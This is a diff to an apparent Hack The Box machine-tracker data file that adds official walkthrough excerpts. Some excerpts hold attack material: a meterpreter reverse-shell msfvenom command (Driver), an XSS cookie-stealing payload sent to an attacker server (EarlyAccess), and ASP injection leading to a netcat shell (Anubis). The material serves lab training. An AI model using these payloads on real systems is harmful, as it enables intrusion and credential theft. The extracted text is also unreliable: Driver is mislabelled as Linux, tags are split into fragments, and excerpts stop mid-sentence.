+      "Meterpreter"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/driver",
     "writeupUrl": "https://0xdf.gitlab.io/tags#driver",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Driver is an easy Linux machine that focuses on printer exploitation.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-10-02T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Driver is an easy Linux machine that focuses on printer exploitation.",
+    "skillsLearned": [
+      "Hash capturing",
+      "Meterpreter"
+    ],
+    "officialPdf": "387-Driver_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDriver is an easy Linux machine that focuses on printer exploitation.\n\n### 🎯 Core Skills\n- **Hash capturing**\n- **Meterpreter**\n\n### ⚔️ Foothold Vector\n. Enumeration of the machine reveals that a web server is listening on port 80, along with SMB on port 445 and WinRM on port 5985. Navigation to the website reveals that it's protected using basic HTTP authentication. While trying common credentials the admin:admin credential is accepted and we are able to visit the webpage. The webpage provides a feature to upload printer firmwares on an SMB share for a remote team to test and verify. Uploading a Shell Command File that contains a command to fetch a remote file from our local machine, leads to the NTLM hash of the user tony relayed back to us.\n\n### 👑 Privilege Escalation\nSince we have a shell on the remote machine we can try to obtain a meterpreter session, since meterpreter can be very helpful when searching for local privilege escalation exploits. First, we create a malicious executable that will return a shell back to our local machine when it gets executed. Then, we need to configure msfconsole. Finally, we can upload and execute our shell.exe on the remote machine using our WinRM session. msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 4444 run upload shell.exe C:\\Users\\tony\\music\\shell."
   },
   {
     "id": "htb-bolt",
@@ -6658,15 +7322,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Docker-Image",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bolt",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bolt",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Bolt is a medium difficulty Linux machine featuring a custom web application providing a docker image file having multiple layers with deleted files. Enumerating deleted database file reveals credentials for an application revealing hints to demo site.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-25T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bolt is a medium difficulty Linux machine featuring a custom web application providing a docker image file having multiple layers with deleted files. Enumerating deleted database file reveals credentials for an application revealing hints to demo site. Further",
+    "skillsLearned": [
+      "Docker Image"
+    ],
+    "officialPdf": "384-Bolt_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBolt is a medium difficulty Linux machine featuring a custom web application providing a docker image file having multiple layers with deleted files. Enumerating deleted database file reveals credentials for an application revealing hints to demo site. Further\n\n### 🎯 Core Skills\n- **Docker Image**\n\n### ⚔️ Foothold Vector\ncan be gained by exploiting the SSTI vulnerability. Enumerating passbolt configuration reveals database credentials that can be used to achieve lateral movement.\n\n### 👑 Privilege Escalation\npassword can be obtained by exploiting the passbolt server. Skills Required Enumeration Basic Docker Knowledge OWASP Top 10 Skills Learned Docker Image Enumeration Server Side Template Injection Password Cracking Passbolt Exploitation Enumeration Nmap Let's start with a port scan. Nmap scan reveals that the target server has OpenSSH (22), HTTP (80) and HTTPS (443) ports open. Nginx is running on both the 80 and 443 ports. We see a domain name in the SSL certificate information. Let's add this to our hosts file. Nginx Browsing to port 443 with the passbolt.bolt.htb domain name reveals that this hosts an open source password manager. ports=$(nmap -p- --min-rate=1000 -T4 10.129.142."
   },
   {
     "id": "htb-validation",
@@ -6682,10 +7353,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/validation",
     "writeupUrl": "https://0xdf.gitlab.io/tags#validation",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": ": Validation is an easy machine created for the September Qualifiers of UHC (Ultimate Hacking Championship). There is a web page that lets users register and specify their country.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-13T09:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": ": Validation is an easy machine created for the September Qualifiers of UHC (Ultimate Hacking Championship). There is a web page that lets users register and specify their country. Once signed in, the website displays other users within your Country and the query it does this is Vulnerable to SQL Injection. The registration function utilizes Prepared Statements and is not SQL Injectable, however the developer trusted that all data from the database was safe and did not use Prepared Statements when viewing others users in the country making this a Second Order SQL Injection.",
+    "officialPdf": "382-Validation_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\n: Validation is an easy machine created for the September Qualifiers of UHC (Ultimate Hacking Championship). There is a web page that lets users register and specify their country. Once signed in, the website displays other users within your Country and the query it does this is Vulnerable to SQL Injection. The registration function utilizes Prepared Statements and is not SQL Injectable, however the developer trusted that all data from the database was safe and did not use Prepared Statements when viewing others users in the country making this a Second Order SQL Injection.\n\n### 👑 Privilege Escalation\nvia a re-used database password. Skills Required Web Enumeration SQL Injection Enumeration Nmap nmap -p- 10.10.11.116 Nmap reveals that 22 (SSH), 80 (HTTP), and 8080 (HTTP) are open. Only Port 80 gives us a page, so we will start there. Homepage (Port 80) Navigating to port 80 reveals a single page that asks for a username and a dropdown box to select the country. If this request is intercepted we can see that the dropdown is just plaintext and we can modify it to be values other than a country. Additionally, the page will send us a cookie back called \"user\" and direct us to /account.php."
   },
   {
     "id": "htb-stacked",
@@ -6696,15 +7370,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "2021",
+      "32090",
+      "CVE-2021-32090",
+      "Exploiting-CVE",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/stacked",
     "writeupUrl": "https://0xdf.gitlab.io/tags#stacked",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Stacked is an insane difficulty Linux machine that focuses on LocalStack / AWS exploitation. Initial access is obtained by exploiting a Cross-Site Scripting vulnerability in a web form, redirecting the client to an internal mail system where details about a LocalStack implementat",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-18T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Stacked is an insane difficulty Linux machine that focuses on LocalStack / AWS exploitation. Initial access is obtained by exploiting a Cross-Site Scripting vulnerability in a web form, redirecting the client to an internal mail system where details about a LocalStack implementation are disclosed. An interactive shell on the LocalStack container is gained by exploiting CVE-2021-32090.",
+    "skillsLearned": [
+      "Creating and executing AWS lambda functions",
+      "Exploiting CVE",
+      "2021",
+      "32090",
+      "LocalStack API handler command injection",
+      "Escalating privileges via docker container creation"
+    ],
+    "officialPdf": "379-Stacked_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nStacked is an insane difficulty Linux machine that focuses on LocalStack / AWS exploitation. Initial access is obtained by exploiting a Cross-Site Scripting vulnerability in a web form, redirecting the client to an internal mail system where details about a LocalStack implementation are disclosed. An interactive shell on the LocalStack container is gained by exploiting CVE-2021-32090.\n\n### 🎯 Core Skills\n- **Creating and executing AWS lambda functions**\n- **Exploiting CVE**\n- **2021**\n- **32090**\n- **LocalStack API handler command injection**\n- **Escalating privileges via docker container creation**\n\n### 🛡️ Associated CVEs\n`CVE-2021-32090`\n\n### ⚔️ Foothold Vector\n. Initial access is obtained by exploiting a Cross-Site Scripting vulnerability in a web form, redirecting the client to an internal mail system where details about a LocalStack implementation are disclosed. An interactive shell on the LocalStack container is gained by exploiting CVE-2021-32090. After escalating privileges in the container via a command injection vulnerability in the docker create command that is automatically triggered whenever a lambda function is executed, a new container with a mapping to the host file system can be created, resulting in\n\n### 👑 Privilege Escalation\naccess to the host. Skills Required Enumeration XSS exploitation Basic AWS knowledge Skills Learned Creating and executing AWS lambda functions Exploiting CVE-2021-32090 LocalStack API handler command injection Escalating privileges via docker container creation Enumeration Nmap Nmap scan shows OpenSSH and Apache listening on their default ports, and a service that is potentially recognised as ssl/docker on port 2376. Apache As shown by the nmap output, the web page on port 80 redirects us to http://stacked.htb/ . We add a corresponding entry to our /etc/hosts file: Upon visiting http://stacked.htb we see a \"Coming Soon\" message. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-gobox",
@@ -6720,10 +7409,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/gobox",
     "writeupUrl": "https://0xdf.gitlab.io/tags#gobox",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": ": Gobox is a medium machine created for the August Finals of UHC (Ultimate Hacking Championship). There are two websites, the home page on port 80 does not have any place for user input; whereas on port 8080 there is a login portal.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-08-23T09:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": ": Gobox is a medium machine created for the August Finals of UHC (Ultimate Hacking Championship). There are two websites, the home page on port 80 does not have any place for user input; whereas on port 8080 there is a login portal. The reset password functionality is vulnerable to SSTI, but the application is written in Go which has unique ways to exploit SSTI. First, users get create an SSTI Payload to dump credentials and upon logging in the source code to the webapp is provided, which allows for creating a gadget to achieve code execution.",
+    "officialPdf": "378-Gobox_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\n: Gobox is a medium machine created for the August Finals of UHC (Ultimate Hacking Championship). There are two websites, the home page on port 80 does not have any place for user input; whereas on port 8080 there is a login portal. The reset password functionality is vulnerable to SSTI, but the application is written in Go which has unique ways to exploit SSTI. First, users get create an SSTI Payload to dump credentials and upon logging in the source code to the webapp is provided, which allows for creating a gadget to achieve code execution.\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration Go SSTI Source Code Analysis AWS S3 Buckets Reverse Engineering Enumeration Nmap Nmap reveals that OpenSSH (22), two webservers (80/8080) are running, and another port 4566 which is the default port for LocalStack. Additionally, ports 9000-9002 are filtered which indicates there are iptable rules blocking access to these ports. Homepage (Port 80) Navigating to port 80 reveals a single page that doesn't have any user input. Checking common extensions with the index page, reveals that index.php exists and indicates the server may process PHP Code. Addition enumeration, shows the HTTP Title is set to {{ ."
   },
   {
     "id": "htb-forge",
@@ -6734,15 +7426,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Python-debugging"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/forge",
     "writeupUrl": "https://0xdf.gitlab.io/tags#forge",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Forge is a medium linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. Specifically, an FTP server is running but it's behind a firewall that prevents any connection except from localh",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-11T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Forge is a medium linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. Specifically, an FTP server is running but it's behind a firewall that prevents any connection except from localhost. Virtual host brute forcing reveals a new admin virtual host that is also blocked from external connections. The main webpage provides the ability to upload image files from URLs, but there are no checks in place to validate if the file is a real image or not.",
+    "skillsLearned": [
+      "Data exfiltration using SSRF",
+      "SSRF localhost filter bypass",
+      "Python debugging"
+    ],
+    "officialPdf": "376-Forge_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nForge is a medium linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. Specifically, an FTP server is running but it's behind a firewall that prevents any connection except from localhost. Virtual host brute forcing reveals a new admin virtual host that is also blocked from external connections. The main webpage provides the ability to upload image files from URLs, but there are no checks in place to validate if the file is a real image or not.\n\n### 🎯 Core Skills\n- **Data exfiltration using SSRF**\n- **SSRF localhost filter bypass**\n- **Python debugging**\n\n### ⚔️ Foothold Vector\nNow that we have gathered some more information about the webserver, we can proceed to explore the Upload an image option on the website. We have two upload options: Upload from local file Upload from URL We could attempt to upload a test file, using the Upload local file option to see what happens to the file after it gets uploaded. Let's create a PHP file containing \"Hello world!\". After the file is uploaded, the server responds with a URL that contains it. We notice that the name of the file has changed to something completely random and the extension is dropped, meaning that the server will not execute any uploaded file. But the contents of the file were preserved.\n\n### 👑 Privilege Escalation\nrelies on a Python script that user is able to execute using sudo. Triggering an error on the script will cause it to execute Pdb , an interactive Python debugger that can interpret Python commands. Since Pdb is running as root , because the main script was executed using sudo , a root shell can be spawned. Skills Required Enumeration Source code review Vhost enumeration Skills Learned Data exfiltration using SSRF SSRF localhost filter bypass Python debugging Enumeration Nmap Nmap output reveals three ports open. On port 21 exists an FTP service that is being blocked by a firewall, which is evident due to the filtered state."
   },
   {
     "id": "htb-earlyaccess",
@@ -6753,15 +7454,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Command-injection",
+      "HTB",
+      "Linux-capabilities",
+      "PHP-filtering",
+      "Reverse-engineering"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/earlyaccess",
     "writeupUrl": "https://0xdf.gitlab.io/tags#earlyaccess",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "EarlyAccess is a Hard Linux machine featuring a web server that is vulnerable to XSS. Exploiting the XSS vulnerability allows the users to get administrative access to the web page.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "EarlyAccess is a Hard Linux machine featuring a web server that is vulnerable to XSS. Exploiting the XSS vulnerability allows the users to get administrative access to the web page. Upon accessing the administrator's panel two more endpoints are discovered and an offline validation script can be downloaded. Upon reverse engineering the offline validation script, a game-key can be generated, which allows the user to access the game virtual host. The game vhost is vulnerable to an SQL injection that allows the user to retrieve and crack the password hash of the admin account.",
+    "skillsLearned": [
+      "Reverse engineering",
+      "PHP filtering",
+      "Command injection",
+      "Offline password cracking",
+      "Linux capabilities"
+    ],
+    "officialPdf": "375-EarlyAccess_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nEarlyAccess is a Hard Linux machine featuring a web server that is vulnerable to XSS. Exploiting the XSS vulnerability allows the users to get administrative access to the web page. Upon accessing the administrator's panel two more endpoints are discovered and an offline validation script can be downloaded. Upon reverse engineering the offline validation script, a game-key can be generated, which allows the user to access the game virtual host. The game vhost is vulnerable to an SQL injection that allows the user to retrieve and crack the password hash of the admin account.\n\n### 🎯 Core Skills\n- **Reverse engineering**\n- **PHP filtering**\n- **Command injection**\n- **Offline password cracking**\n- **Linux capabilities**\n\n### ⚔️ Foothold Vector\nSince we have successfully identified that we are able to perform an XSS attack our next step would be to try stealing the administrator's cookie. First of all we have to set up a local server on our machine using Python. Then, we need to change our username to a payload that will steal the administrator's cookie. python3 -m http.server 9001 <script>document.location=\"http://10.10.14.6:9001/?c=\"+document.cookie;</script> We sent a message, using the Contact us form and we wait. After a short while we get a request back on our local server containing the cookies of the administrator.\n\n### 👑 Privilege Escalation\nfrom www-data to www-adm . An unencrypted file with plain text credentials allows the access of a database endpoint that reveals plain text credentials for drew user. The user drew can use SSH to login on the host machine. An SSH key inside the home folder of drew can be used to access another docker container. The container hosts a Node JS game and whenever the server hangs and restarts, a script executes all Bash scripts that exist inside a directory mounted from the host machine as root ."
   },
   {
     "id": "htb-horizontall",
@@ -6772,15 +7487,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2019-18818",
+      "CVE-2019-19609",
+      "CVE-2021-3129",
+      "HTB",
+      "Port-Forwarding",
+      "Source-Code-Review"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/horizontall",
     "writeupUrl": "https://0xdf.gitlab.io/tags#horizontall",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-08-28T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed.",
+    "skillsLearned": [
+      "Source Code Review",
+      "Port Forwarding"
+    ],
+    "officialPdf": "374-Horizontall_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHorizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed.\n\n### 🎯 Core Skills\n- **Source Code Review**\n- **Port Forwarding**\n\n### 🛡️ Associated CVEs\n`CVE-2019-18818`, `CVE-2019-19609`, `CVE-2021-3129`\n\n### ⚔️ Foothold Vector\nUsing Searchsploit on our local machine to search for possible exploits for the Strapi CMS we are presented with three options. According to the exploit titles, version 3.0.0-beta.17.4 of Strapi CMS is vulnerable to Remote Code Execution (RCE), without being authenticated, in the administrator panel. Since we do not have any credential to try on the administrator panel we should find out if the version on the remote machine matches the one on the exploit. We should copy the exploit script on our local folder using the command searchsploit -m 50239.py and take a closer look on the source code. # Exploit Title: Strapi CMS 3.0.0-beta.17.\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration Linux Enumeration Basic SSH Knowledge Skills Learned Source Code Review Port Forwarding Enumeration Nmap The Nmap output reveals just ports open. On port 22 SSH is running and on port 80 an Nginx web server. Since we have no credentials to try logging in with SSH we turn our attention to port 80. Nmap didn't follow a redirect to http://horizontall.htb upon making a request on port 80. Let's modify our hosts file to include horizontall.htb . Nginx ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.105 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.105 echo \"10.10.11.105 horizontall."
   },
   {
     "id": "htb-previse",
@@ -6791,15 +7518,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "PATH-hijacking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/previse",
     "writeupUrl": "https://0xdf.gitlab.io/tags#previse",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Previse is a easy machine that showcases Execution After Redirect (EAR) which allows users to retrieve the contents and make requests to accounts.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-08-07T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Previse is a easy machine that showcases Execution After Redirect (EAR) which allows users to retrieve the contents and make requests to accounts.",
+    "skillsLearned": [
+      "Execution After Redirect (EAR) abuse.",
+      "Abusing PHP exec() function",
+      "Hash cracking with unicode salt",
+      "PATH hijacking"
+    ],
+    "officialPdf": "373-Previse_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPrevise is a easy machine that showcases Execution After Redirect (EAR) which allows users to retrieve the contents and make requests to accounts.\n\n### 🎯 Core Skills\n- **Execution After Redirect (EAR) abuse.**\n- **Abusing PHP exec() function**\n- **Hash cracking with unicode salt**\n- **PATH hijacking**\n\n### ⚔️ Foothold Vector\nskills Basic password cracking skills Basic Linux\n\n### 👑 Privilege Escalation\nstarts with the retrieval and cracking of a custom MD5Crypt hash which consists of a unicode salt and once cracked allows users to gain SSH access to the target then abusing a sudo executable script which does not include absolute paths of the functions it utilises which allows users to perform PATH hijacking on the target to compromise the machine. Skills Required Basic web exploitation skills Basic password cracking skills Basic Linux privilege escalation skills Skills Learned Execution After Redirect (EAR) abuse. Abusing PHP exec() function Hash cracking with unicode salt PATH hijacking Enumeration Nmap The nmap scan shows that SSH and Apache are listening on their default ports."
   },
   {
     "id": "htb-developer",
@@ -6810,15 +7547,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "AES-CTR-Decryption",
+      "Django-hash-cracking",
+      "HTB",
+      "Rust-Reversing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/developer",
     "writeupUrl": "https://0xdf.gitlab.io/tags#developer",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Developer is a hard machine that outlines the severity of tabnabbing vulnerability in web applications where attackers can control the input of an input field with target=\"_blank\" allowing attackers to open a new tab to access their malicious page and redirect the previous tab to",
     "timeSpentSeconds": 0,
     "createdAt": "2021-08-21T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Developer is a hard machine that outlines the severity of tabnabbing vulnerability in web applications where attackers can control the input of an input field with target=\"_blank\" allowing attackers to open a new tab to access their malicious page and redirect the previous tab to an attacker controlled location if mixed with an XSS injection. This attack leads to fooling site users and administrators into entering their credentials into a phishing template of the original site's login. Subdomain",
+    "skillsLearned": [
+      "Reverse Tabnabbing Vulnerability via XSS",
+      "Manual Application Testing",
+      "Python Django Deserialization",
+      "Django hash cracking",
+      "Rust Reversing",
+      "AES CTR Decryption"
+    ],
+    "officialPdf": "372-Developer_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDeveloper is a hard machine that outlines the severity of tabnabbing vulnerability in web applications where attackers can control the input of an input field with target=\"_blank\" allowing attackers to open a new tab to access their malicious page and redirect the previous tab to an attacker controlled location if mixed with an XSS injection. This attack leads to fooling site users and administrators into entering their credentials into a phishing template of the original site's login. Subdomain\n\n### 🎯 Core Skills\n- **Reverse Tabnabbing Vulnerability via XSS**\n- **Manual Application Testing**\n- **Python Django Deserialization**\n- **Django hash cracking**\n- **Rust Reversing**\n- **AES CTR Decryption**\n\n### 👑 Privilege Escalation\nRust Reversing Performing basic enumeration checks we check the sudo -l entries and see an entry that allows us to execute an authentication binary as the root user. When we execute the binary we can see that it prompts us for a password. We transfer the binary back to our localhost with scp . With the binary on our local machine, we need to analyze it. scp -P 2222 /root/.auth/authenticator tcg@10.10.14.21:/home/tcg/htb/developer/ Checking the file type we can see that the binary is a 64-bit non-stripped elf so we can pull the function names from the binary. Running the binary in Ghidra we begin to analyze the process of the main function."
   },
   {
     "id": "htb-anubis",
@@ -6829,15 +7580,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "ASP-code-injection",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/anubis",
     "writeupUrl": "https://0xdf.gitlab.io/tags#anubis",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Anubis is an insane difficulty Windows machine that showcases how a writable certificate template in the Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an Active Directory environment. An interactive shell on a Windows contai",
     "timeSpentSeconds": 0,
     "createdAt": "2021-08-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Anubis is an insane difficulty Windows machine that showcases how a writable certificate template in the Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an Active Directory environment. An interactive shell on a Windows container can be obtained by exploiting a simple ASP code injection vulnerability in a public-facing web application.",
+    "skillsLearned": [
+      "ASP code injection",
+      "XSS to RCE in Electron applications",
+      "Exploiting misconfigured certificate templates"
+    ],
+    "officialPdf": "371-Anubis_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAnubis is an insane difficulty Windows machine that showcases how a writable certificate template in the Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an Active Directory environment. An interactive shell on a Windows container can be obtained by exploiting a simple ASP code injection vulnerability in a public-facing web application.\n\n### 🎯 Core Skills\n- **ASP code injection**\n- **XSS to RCE in Electron applications**\n- **Exploiting misconfigured certificate templates**\n\n### ⚔️ Foothold Vector\nThe contact form appears to be vulnerable to ASP code injection, as we can verify by sending the following message: <% response.write(\"Testing ASP code injection\") %> As we can see, the code was parsed and response.write() was executed. We can turn this into Remote Command Execution and obtain a reverse shell on the system. First, we try executing a simple command by sending the following payload: The command is executed: To get a reverse shell, we first transfer nc64.exe to the target by running a Python http.server on our machine: The download will be initiated by sending the following payload (where 10.10.14.\n\n### 👑 Privilege Escalation\nWe connect to the CertEnroll share: Among other files, the CA certificate for the domain is available. We download it. proxychains smbclient //172.29.240.1/Shared -U localadmin smb: \\> cd Documents\\ smb: \\Documents\\> cd Analytics\\ smb: \\Documents\\Analytics\\> put Whatif.omv proxychains smbclient //172.29.240.1/CertEnroll -U localadmin From our shell on the earth host we list the available certificate templates: The user is allowed access to the Web template. We look at the template permissions: certutil -catemplates certutil -v -dstemplate Web Users in the webdevelopers group have full control over the template."
   },
   {
     "id": "htb-writer",
@@ -6848,15 +7608,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Local-File-Inclusion",
+      "Virtual-Host"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/writer",
     "writeupUrl": "https://0xdf.gitlab.io/tags#writer",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Writer is a medium Linux machine that outlines poor coding practices and presents how a file read vulnerability through SQL injection can lead to disclosure of source code files which include credentials. The combination of password reuse on the SMB service with a blind SSRF expl",
     "timeSpentSeconds": 0,
     "createdAt": "2021-07-31T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Writer is a medium Linux machine that outlines poor coding practices and presents how a file read vulnerability through SQL injection can lead to disclosure of source code files which include credentials. The combination of password reuse on the SMB service with a blind SSRF exploitation via an image upload function can lead to a foothold on the system. By abusing Django features it is possible to extract and crack user credentials.",
+    "skillsLearned": [
+      "Vulnerability detection in Python",
+      "UNION based SQL Injections",
+      "Local File Inclusion",
+      "Virtual Host"
+    ],
+    "officialPdf": "361-Writer_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nWriter is a medium Linux machine that outlines poor coding practices and presents how a file read vulnerability through SQL injection can lead to disclosure of source code files which include credentials. The combination of password reuse on the SMB service with a blind SSRF exploitation via an image upload function can lead to a foothold on the system. By abusing Django features it is possible to extract and crack user credentials.\n\n### 🎯 Core Skills\n- **Vulnerability detection in Python**\n- **UNION based SQL Injections**\n- **Local File Inclusion**\n- **Virtual Host**\n\n### ⚔️ Foothold Vector\nvia an image upload function can lead to a foothold on the system. By abusing Django features it is possible to extract and crack user credentials. Further abusing multiple misconfigurations in Postfix service leads to exploit privileges in the apt service folders allowing those users to execute commands as\n\n### 👑 Privilege Escalation\nthrough a script that updates the machine every minute. Skills Required Understanding of Python Django Web skills SQL Knowledge Source Code Review POSTFIX basic knowledge SMB usage Researching skills Skills Learned Vulnerability detection in Python UNION based SQL Injections Local File Inclusion Virtual Host enumeration Django hash cracking Blind SSRF injection Identifying system misconfigurations Enumeration Nmap The nmap scan shows that SSH, SMB and a website are listening on their default ports. Checking the SMB shows we cannot access the service without authentication so we take a look at the website. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-pikaboo",
@@ -6867,15 +7638,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "\"Off",
+      "HTB",
+      "Local-File-Inclusion",
+      "Perl-function-injection",
+      "slash\"-vulnerability"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/pikaboo",
     "writeupUrl": "https://0xdf.gitlab.io/tags#pikaboo",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Pikaboo is a Hard Linux machine where only FTP, SSH, and Web services are exposed. The website is hosting on Apache a pokatmon collection page.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-07-17T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Pikaboo is a Hard Linux machine where only FTP, SSH, and Web services are exposed. The website is hosting on Apache a pokatmon collection page. Common misconfigurations in the NGINX proxy server allow performing a path traversal attack. Exploiting this, it is possible to get access in the administration panel where a vulnerable to LFI page gives the opportunity to perform FTP Log poisoning and gain a foothold to the system. Performing basic",
+    "skillsLearned": [
+      "\"Off",
+      "slash\" vulnerability",
+      "Perl function injection",
+      "Local File Inclusion"
+    ],
